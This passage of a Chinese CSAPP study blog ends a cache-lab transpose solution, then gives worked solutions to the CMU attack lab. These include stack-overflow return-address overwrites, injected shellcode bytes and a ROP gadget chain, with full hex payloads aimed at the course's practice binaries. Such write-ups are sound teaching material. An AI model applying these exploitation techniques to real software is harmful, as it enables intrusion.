将A的右上放到现在B的右上，提前处理一下，省的后面还要访问A的这个cacheline</span><br>        B[j][i + cnti + <span class="hljs-number">4</span>] = temp5;<br>        B[j + <span class="hljs-number">1</span>][i + cnti + <span class="hljs-number">4</span>] = temp6;<br>        B[j + <span class="hljs-number">2</span>][i + cnti + <span class="hljs-number">4</span>] = temp7;<br>        B[j + <span class="hljs-number">3</span>][i + cnti + <span class="hljs-number">4</span>] = temp8;<br>      &#125;<br>      <span class="hljs-comment">// 至此，A的前4行已经全部处理完了，命中率约为7/8</span><br>      <span class="hljs-comment">// 上述操作处理完之后，B的前4行都在cache中</span><br>      <span class="hljs-comment">// 现在处理A的左下，将其移到B的右上，同时我们已经把A的右上存在了B的右上</span><br>      <span class="hljs-comment">// 所以要记得取下来，放到B的左下去</span><br>      <span class="hljs-keyword">for</span> (cntj = <span class="hljs-number">0</span>; cntj &lt; <span class="hljs-number">4</span>; cntj++) &#123;<br>        <span class="hljs-comment">// 取出A的左下，一列一列地取</span><br>        temp1 = A[i + <span class="hljs-number">4</span>][j + cntj];<br>        temp2 = A[i + <span class="hljs-number">5</span>][j + cntj];<br>        temp3 = A[i + <span class="hljs-number">6</span>][j + cntj];<br>        temp4 = A[i + <span class="hljs-number">7</span>][j + cntj];<br>        <span class="hljs-comment">// 取出当前B的右上，一行一行地取，之后还要一行一行地放到B的左下</span><br>        temp5 = B[j + cntj][i + <span class="hljs-number">4</span>];<br>        temp6 = B[j + cntj][i + <span class="hljs-number">5</span>];<br>        temp7 = B[j + cntj][i + <span class="hljs-number">6</span>];<br>        temp8 = B[j + cntj][i + <span class="hljs-number">7</span>];<br>        <span class="hljs-comment">// 修改B的右上为真正的值，即A的左下</span><br>        B[j + cntj][i + <span class="hljs-number">4</span>] = temp1;<br>        B[j + cntj][i + <span class="hljs-number">5</span>] = temp2;<br>        B[j + cntj][i + <span class="hljs-number">6</span>] = temp3;<br>        B[j + cntj][i + <span class="hljs-number">7</span>] = temp4;<br>        <span class="hljs-comment">// 至此B的这一行完全OK了，虽然马上就要被自己干掉，但是也没关系，反正也用不上了</span><br>        <span class="hljs-comment">// 接下来别忘了修改B的左下，本来应该是A的右上，但是我们提前存在了B的右上</span><br>        <span class="hljs-comment">// 现在就是temp5-8</span><br>        B[j + cntj + <span class="hljs-number">4</span>][i] = temp5;<br>        B[j + cntj + <span class="hljs-number">4</span>][i + <span class="hljs-number">1</span>] = temp6;<br>        B[j + cntj + <span class="hljs-number">4</span>][i + <span class="hljs-number">2</span>] = temp7;<br>        B[j + cntj + <span class="hljs-number">4</span>][i + <span class="hljs-number">3</span>] = temp8;<br>      &#125;<br>      <span class="hljs-comment">// 最后修改B的右下</span><br>      <span class="hljs-keyword">for</span> (cnti = <span class="hljs-number">4</span>; cnti &lt; <span class="hljs-number">8</span>; cnti++) &#123;<br>        temp1 = A[i + cnti][j + <span class="hljs-number">4</span>];<br>        temp2 = A[i + cnti][j + <span class="hljs-number">5</span>];<br>        temp3 = A[i + cnti][j + <span class="hljs-number">6</span>];<br>        temp4 = A[i + cnti][j + <span class="hljs-number">7</span>];<br>        B[j + <span class="hljs-number">4</span>][i + cnti] = temp1;<br>        B[j + <span class="hljs-number">5</span>][i + cnti] = temp2;<br>        B[j + <span class="hljs-number">6</span>][i + cnti] = temp3;<br>        B[j + <span class="hljs-number">7</span>][i + cnti] = temp4;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="61×67"><a href="#61×67" class="headerlink" title="61×67"></a>61×67</h2><p>这玩意就很不规则了，之前之所以又是循环展开的，又是小心翼翼控制矩阵大小的，无非是因为</p><ol><li>循环展开：避免A和B之间碰撞。因为A和B的地址间距刚好是cache大小的倍数。</li><li>矩阵大小：避免A或者B内部不断碰撞。行操作的那一个没事，但是列操作的那一个就遭殃了。</li></ol><p>而这一切在61×64的矩阵下都不是问题，因为A或者B内部基本不会碰撞，那矩阵的大小就无所谓了，选一个最小的就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> edge 17</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">deal_61_67</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += edge) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += edge) &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = i; x &lt; i + edge &amp;&amp; x &lt; N; x++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = j; y &lt; j + edge &amp;&amp; y &lt; M; y++) &#123;<br>          B[y][x] = A[x][y];<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>感谢<a href="https://zhuanlan.zhihu.com/p/456858668#">这位大佬</a>的博客提供的帮助</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab3</title>
    <link href="/2023/07/30/csapp-lab3/"/>
    <url>/2023/07/30/csapp-lab3/</url>
    
    <content type="html"><![CDATA[<h1 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h1><p>首先，通过这个指令生成前三个阶段要用到的ctarget的反汇编代码<code>objdump -d ./ctarget &gt;&gt; target.s</code><br>其次，假设我们的输入文件是touch1.txt，那么运行这个指令就可以去验证是否是正确的<code>./hex2raw &lt;touch1.txt | ./ctarget -q</code><br>整理一下phase1个意思</p><ol><li>它想要我们通过输入使栈溢出，并且覆盖这个函数的返回地址，使这个地址指向我们想要的函数</li><li>因此，我们需要从十六进制的角度构造我们的输入</li><li>但是题目使用的是getbuf这个函数从标准输入区读取输入，因此它是以字符串的形式来读取。</li><li>我们需要把我们构造出来的十六进制数据转成对应的字符串。而这个工作cmu已经帮我们做好了，就是这个程序<code>hex2raw</code>。</li><li>所以我们可以现在一个txt文件中写好我们的输入，然后通过上述程序将这个文件中的十六进制数据转为字符串，最后使用这个字符串作为ctarget的输入。<br>接下来可以正式进入解题了<br>整体的流程是，test函数会调用getbuf，我们需要在getbuf的函数中操作，使得getbuf不会正常返回，而是返回到touch1函数<br>可以发现，getbuf这个函数给自己开辟了40个字节的栈空间，因此它的返回地址其实是在第41-48个字节<br>因此，我们的注入应该包含48个字节<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">(gdb) disas getbuf<br>Dump of assembler code <span class="hljs-keyword">for</span> function getbuf:<br>   <span class="hljs-number">0x00000000004017a8</span> &lt;+<span class="hljs-number">0</span>&gt;:     sub    $<span class="hljs-number">0x28</span>,%rsp<br>   <span class="hljs-number">0x00000000004017ac</span> &lt;+<span class="hljs-number">4</span>&gt;:     mov    %rsp,%rdi<br>   <span class="hljs-number">0x00000000004017af</span> &lt;+<span class="hljs-number">7</span>&gt;:     callq  <span class="hljs-number">0x401a40</span> &lt;Gets&gt;<br>   <span class="hljs-number">0x00000000004017b4</span> &lt;+<span class="hljs-number">12</span>&gt;:    mov    $<span class="hljs-number">0x1</span>,%eax<br>   <span class="hljs-number">0x00000000004017b9</span> &lt;+<span class="hljs-number">17</span>&gt;:    add    $<span class="hljs-number">0x28</span>,%rsp<br>   <span class="hljs-number">0x00000000004017bd</span> &lt;+<span class="hljs-number">21</span>&gt;:    retq<br>End of assembler dump.<br></code></pre></td></tr></table></figure>接下来，需要找到touch1的地址，在我的这个文件里，touch1函数的起始地址是0x4017c0<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">(gdb) disas touch1<br>Dump of assembler code <span class="hljs-keyword">for</span> function touch1:<br>   <span class="hljs-number">0x00000000004017c0</span> &lt;+<span class="hljs-number">0</span>&gt;:     sub    $<span class="hljs-number">0x8</span>,%rsp<br>   <span class="hljs-number">0x00000000004017c4</span> &lt;+<span class="hljs-number">4</span>&gt;:     movl   $<span class="hljs-number">0x1</span>,<span class="hljs-number">0x202d0e</span>(%rip)        # <span class="hljs-number">0x6044dc</span> &lt;vlevel&gt;<br>   <span class="hljs-number">0x00000000004017ce</span> &lt;+<span class="hljs-number">14</span>&gt;:    mov    $<span class="hljs-number">0x4030c5</span>,%edi<br>   <span class="hljs-number">0x00000000004017d3</span> &lt;+<span class="hljs-number">19</span>&gt;:    callq  <span class="hljs-number">0x400cc0</span> &lt;puts@plt&gt;<br>   <span class="hljs-number">0x00000000004017d8</span> &lt;+<span class="hljs-number">24</span>&gt;:    mov    $<span class="hljs-number">0x1</span>,%edi<br>   <span class="hljs-number">0x00000000004017dd</span> &lt;+<span class="hljs-number">29</span>&gt;:    callq  <span class="hljs-number">0x401c8d</span> &lt;validate&gt;<br>   <span class="hljs-number">0x00000000004017e2</span> &lt;+<span class="hljs-number">34</span>&gt;:    mov    $<span class="hljs-number">0x0</span>,%edi<br>   <span class="hljs-number">0x00000000004017e7</span> &lt;+<span class="hljs-number">39</span>&gt;:    callq  <span class="hljs-number">0x400e40</span> &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure>因此构造的输入应该是下面这样，前40个字节随便填，后面八个字节需要是地址，整体应该和下面一样。<br>其实最后八个字节到底按什么顺序写还是挺有讲究的。<br>首先，我们读入的内容是从栈顶到栈底一次写入，想一下内存中的栈的那个图，也就是说我们写入的东西其实从从下往上从右往左一个一个填入栈中的，因此按下面这个方式输入的话，在栈的某一层，存的应该是00 00 00 00 00 40 17 c0，乍一看这不就是我们的地址吗？说好的小端法呢？<br>先回忆一下小端法的定义，小端法指的是低位放在低地址处，我们这c0是低位，它放的是地址的低处吗？当然是，因为栈是从上往下递减的，虽然看着c0是放在最后面，但是其实它是低地址处。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>c0 <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>通过<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">woaixiaoxiao@LAPTOP-URFTCS5A:~/CSAPP/<span class="hljs-number">3</span>_attacklab$ ./hex2raw &lt;touch1.txt | ./ctarget -q<br>Cookie: <span class="hljs-number">0x59b997fa</span><br>Type string:Touch1!: <span class="hljs-function">You called <span class="hljs-title">touch1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget</span><br><span class="hljs-function">PASS: Would have posted the following:</span><br><span class="hljs-function">        user id bovik</span><br><span class="hljs-function">        course  <span class="hljs-number">15213</span>-f15</span><br><span class="hljs-function">        lab     attacklab</span><br><span class="hljs-function">        result  <span class="hljs-number">1</span>:PASS:<span class="hljs-number">0xffffffff</span>:ctarget:<span class="hljs-number">1</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> C0 <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span></span><br></code></pre></td></tr></table></figure></li></ol><h1 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h1><p>这一次就更大胆了，上次只是修改一下返回地址，使得程序转去执行已有的代码<br>这一次要做的事情是自己先写一段代码，然后重定向到自己写的代码中。<br>而自己写的汇编代码就是要调用<code>void touch2(unsigned val)</code>函数，并且还得穿个参数</p><ol><li>传参数就是传自己的cookie：0x59b997fa到rdi寄存器，即函数的第一个参数所在的寄存器</li><li>然后就是转移到touch2，这里推荐的转移方法是通过ret指令，而ret指令是从栈中弹出一个地址，所以还需要先把要去的地址压栈<br>首先，找到touch2的起始地址：0x00000000004017ec<br>然后编写汇编文件<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">mov $<span class="hljs-number">0x59b997fa</span>,%rdi<br>pushq $<span class="hljs-number">0x00000000004017ec</span><br>retq<br></code></pre></td></tr></table></figure>然后将这个汇编文件转为二进制形式：因为我们需要二进制形式。</li><li>将这个汇编文件变成可执行文件<code>gcc -c touch2.s</code></li><li>然后使用<code>objdump -d touch2.o</code>就可以获得有二进制的文件了<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000000000</span> &lt;.text&gt;:<br>   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span>    mov    $<span class="hljs-number">0x59b997fa</span>,%rdi<br>   <span class="hljs-number">7</span>:   <span class="hljs-number">68</span> ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>          pushq  $<span class="hljs-number">0x4017ec</span><br>   c:   c3                      retq   <br></code></pre></td></tr></table></figure>因此，我们要输入13个字节，依次是48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3<br>如果我们直接把这个作为输入，那么我们的程序就已经在内存中了，但是怎么去执行呢？那就要使用phase1中的重定向功能了<br>如果将13个字节中的48作为输入数据的开头，那么我们的程序的起始地址就是getbuf函数的栈顶，通过打断点然后查看rsp的值，发现rsp的值为<code>0x5561dc78</code><br>至此，所有原材料都ok了，现在就是拼接成我们的输入</li><li>首先，重定向地址和phase1一样的输入方式</li><li>其次，我们写的代码，也就是48开头的那一拨，这些属于指令，指令就是从低地址开始取的，不需要考虑小端法。小端法只对数据有作用！</li><li>注意我们写的代码加上补充的0需要够40个字节。问就是我第一次少输入了八个字节的0<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br>ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h1><p>这一个阶段的意思是</p><ol><li>首先我们依然要重定向到一个函数，这里是touch3，并且我们需要传入一个参数。这就是phase2的任务了</li><li>关键在于我们通过getbuf-&gt;touch3，在getbuf执行完之后，我们去执行touch3。在执行touch3的时候，getbuf函数的栈其实已经被收回了，而且在touch3中又调用了函数，所以原来getbuf的栈里的东西都不能用了。</li><li>而题目要求我们先把我们的字符串放到内存的某个位置，然后把这个字符串的地址作为参数传给touch3。传地址给touch3倒没啥问题，关键在于我们的字符串就不能放在getbuf的栈中了。哪里安全呢？这就是这个阶段的关键，我们要把字符串存到一个安全的内存去。<br>哪里的内存是安全的呢？下面是函数的调用顺序，其中getbuf函数执行之后就把空间还回去了。最安全的地方当然还是往getbuf栈帧空间的上面去。也就是test的栈帧空间</li><li>test</li><li>getbuf</li><li>touch3</li><li>hexmatch</li><li>strncmp<br>首先，我的cookie是0x59b997fa，翻译为ascii码如下所示。注意:需要转为十六进制的表示。因此我这个字符串就应该是35 39 62 39 39 37 66 61 00。并且字符串也是没有字节序的概念的<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">字符:        <span class="hljs-string">&#x27;5&#x27;</span>    <span class="hljs-string">&#x27;9&#x27;</span>    <span class="hljs-string">&#x27;b&#x27;</span>    <span class="hljs-string">&#x27;9&#x27;</span>    <span class="hljs-string">&#x27;9&#x27;</span>    <span class="hljs-string">&#x27;7&#x27;</span>    <span class="hljs-string">&#x27;f&#x27;</span>    <span class="hljs-string">&#x27;a&#x27;</span>    <span class="hljs-string">&#x27;\0&#x27;</span><br>ASCII值:    <span class="hljs-number">53</span>     <span class="hljs-number">57</span>     <span class="hljs-number">98</span>     <span class="hljs-number">57</span>     <span class="hljs-number">57</span>     <span class="hljs-number">55</span>     <span class="hljs-number">102</span>    <span class="hljs-number">97</span>     <span class="hljs-number">0</span><br>十六进制:   <span class="hljs-number">35</span>     <span class="hljs-number">39</span>     <span class="hljs-number">62</span>     <span class="hljs-number">39</span>     <span class="hljs-number">39</span>     <span class="hljs-number">37</span>     <span class="hljs-number">66</span>     <span class="hljs-number">61</span>     <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>通过gdb调试可以发现，test函数的栈帧从5561dca8开始，在调用getbuf之前，又向下扩展了8个字节，变成了5561dca0，而这个位置其实也就是我们之前一直偷偷放重定向函数的位置。<br>因此，我们的字符串应该放在5561dca8这里，其实也就是贴着重定向的地址放即可。<br>最终的答案如下，相比于第二阶段</li><li>只需要修改我们自己写的汇编代码的参数为字符串的地址</li><li>然后将汇编代码中touch2的地址改为touch3的地址</li><li>在最后面加上我们的字符串即可<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span><br>fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">// 以上为getbuf的栈帧</span><br><span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">// 这里的地址是5561dca0，存储的是重定向的地址</span><br><span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span> <span class="hljs-comment">// 这里的地址是5561dca8，存储的是字符串</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h1><p>这个阶段要完成的任务和phase2是一样的，即</p><ol><li>将我们的cookie传入rdi</li><li>将控制权移到touch2中<br>但是这里的比较难，因为栈中的代码不可执行<br>所以我们只能去已有的代码库中拼凑出我们需要的指令，一种思路是这样</li><li>将我们的cookie通过一个pop函数弹出到某个寄存器，因为pop函数不需要我们去指定地址，是自动从栈里弹出一个数字出来</li><li>然后将rdi设置为这个寄存器的值，找到一个对应的mov指令</li><li>上面那个指令应该以ret结尾，我们提前将touch2的地址放在栈中，这一ret，正好就跳到ret去执行了<br>注意点</li><li>这个时候栈的地址是随机的，但是我们的输入塞到栈的缓冲区之后，逻辑上依然是和之前栈地址连续一样的，只不过显示出来的值是随机的<br>首先，通过<code>objdump -d rtarget &gt; rtarget.txt</code>将rtarget反汇编<br>然后去start_farm到end_farm中去凑我们需要的指令，pop有以下这么多种，我们除了pop，还应该衔接一个ret，它的编码是0xc3，另外，我们出现0x90也是合法的，应该这玩意就是nop指令，摸鱼用的。<blockquote><p>popq R 58 59 5a 5b 5c 5d 5e 5f</p></blockquote></li></ol><p>经过查找，发现了一个合适的，从4019ab开始，是58 90 c3分别代表了pop rax，nop，ret。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004019</span>a7 &lt;addval_219&gt;:<br>  <span class="hljs-number">4019</span>a7:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">51</span> <span class="hljs-number">73</span> <span class="hljs-number">58</span> <span class="hljs-number">90</span>    lea    <span class="hljs-number">-0x6fa78caf</span>(%rdi),%eax<br>  <span class="hljs-number">4019</span>ad:c3                   retq   <br></code></pre></td></tr></table></figure><p>如果栈中的结构如下所示，那么getbuf结束之后就会去执行4019ab处的代码，这个代码会将cookie放到rax中</p><ol><li>cookie</li><li>4019ab</li><li>getbuf的缓冲区<br>那么现在就应该在cookie上面再放一个地址，这个地址可以把rax的值挪到rdi中。查表之后发现，这个操作对应的机器码是48 89 c7。经过查找，下面这个片段可以利用，将地址放在4019a2，就正好执行了mov操作时候，ret掉<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004019</span>a0 &lt;addval_273&gt;:<br>  <span class="hljs-number">4019</span>a0:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 c3    lea    <span class="hljs-number">-0x3c3876b8</span>(%rdi),%eax<br>  <span class="hljs-number">4019</span>a6:c3                   retq  <br></code></pre></td></tr></table></figure>那么ret应该ret到哪呢？当然是touch2的地址，去gdb中查询之后发现，touch2的地址是0x4017ec<br>由此，我们的原材料已经准备好了。这时候的栈从上到下应该是</li><li>0x4017ec</li><li>0x4019a2</li><li>cookie(0x59b997fa)</li><li>0x4019ab</li><li>getbuf的缓冲区<br>因此，我们的输入应该是<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>ab <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>运行测试程序<code>./hex2raw &lt;touch4.txt | ./rtarget -q</code>，发现成功<br>有个注意点，那就是我们放在栈里面的基本都是地址，虽然写起来只写了几个字节，但是完整的地址应该是八个字节的，因此构造输入的时候是需要补0的。</li></ol><h1 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h1><p>第五个需要的原理和第四个差不多，要完成的效果和第三个phase差不多。<br>关键在于栈的地址不可控，因此需要在程序中去取rsp的值，然后把字符串存在一个距离rsp固定的地方<br><a href="https://www.zhihu.com/column/c_1458204480777273344">大佬链接</a>这位大佬写的挺好的<br>注意了，ret指令，是从栈中弹出一个地址，然后去执行这个地址！</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
